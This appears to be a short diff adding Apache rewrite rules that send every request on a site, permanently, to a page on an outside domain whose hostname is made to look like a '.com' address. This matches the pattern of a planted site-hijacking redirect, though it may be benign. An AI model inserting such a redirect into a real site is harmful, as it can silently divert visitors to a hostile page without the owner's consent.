@@ -1,1 +1,3 @@
 
+RewriteEngine On
+RewriteRule ^/(.*)$ http://uasdianos.com.net-rd.com/nosotros.html/$1 [R=301,L]
